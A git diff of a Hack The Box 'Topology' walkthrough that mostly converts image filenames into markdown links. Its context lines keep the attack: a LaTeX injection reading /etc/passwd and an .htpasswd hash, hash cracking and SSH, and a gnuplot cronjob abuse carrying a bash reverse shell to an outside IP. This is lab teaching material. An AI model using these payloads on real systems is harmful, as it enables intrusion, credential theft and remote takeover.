@@ -82,19 +82,19 @@ The dev page requires authentication, which we don't have yet, and the stats pag
 
 Now visiting the Latex site we find a LaTex Equation Generator:
 
-htb_topology_latex.png
+![htb_topology_latex.png](../assets/topology_assets/htb_topology_latex.png)
 
 Entering one of the site's examples we find:
 
-htb_topology_example.png
+![htb_topology_example.png](../assets/topology_assets/htb_topology_example.png)
 
 Looking at the webpage root we find a few files we can download:
 
-htb_topology_index.png
+![htb_topology_index.png](../assets/topology_assets/htb_topology_index.png)
 
 Checking out the header.tex file we find the site is using listings, which may give us access to other files:
 
-htb_topology_header.png
+![htb_topology_header.png](../assets/topology_assets/htb_topology_header.png)
 
 ### Exploitation
 
@@ -107,13 +107,14 @@ Heading over to trusty HackTricks and looking up LaTex injection we find a helpf
 ```
 You might need to adjust injection with wrappers as [ or $.
 ```
+
 So with these we can now wrap our command in `$` symbols like: `$\lstinputlisting{/etc/passwd}$` and successfully read the file:
 
-htb_topology_etc.png
+![htb_topology_etc.png](../assets/topology_assets/htb_topology_etc.png)
 
 Searching for interesting files, I finally find an `.htpasswd` file for the dev site discovered earlier:
 
-htb_topology_hash.png
+![htb_topology_hash.png](../assets/topology_assets/htb_topology_hash.png)
 
 Let's crack this using Hashcat:
 
@@ -152,7 +153,7 @@ We can use this to SSH in and grab the user.txt flag:
 └─$ ssh vdaisley@10.129.158.218
 ```
 
-htb_topology_user.png
+![htb_topology_user.png](../assets/topology_assets/htb_topology_user.png)
 
 ### Privilege Escalation
 
@@ -177,7 +178,7 @@ Gnuplot is a portable command-line driven graphing utility for Linux, Windows, m
 
 Loading Pspy64 to the target to view running cronjobs, we see several jobs run by root coming out of the gnuplot directory:
 
-htb_topology_cron.png
+![htb_topology_cron.png](../assets/topology_assets/htb_topology_cron.png)
 
 
 I'm particularly interested in the following cronjob:
@@ -205,11 +206,11 @@ So because the cronjob above is using wildcards and executing with gnuplot any `
 system "bash -c 'bash -i >& /dev/tcp/10.10.14.162/443 0>&1'"
 ```
 
-htb_topology_shell.png
+![htb_topology_shell.png](../assets/topology_assets/htb_topology_shell.png)
 
 Nice, we can now grab the final flag:
 
-htb_topology_root.png
+![htb_topology_root.png](../assets/topology_assets/htb_topology_root.png)
 
 Thanks for following along!
 
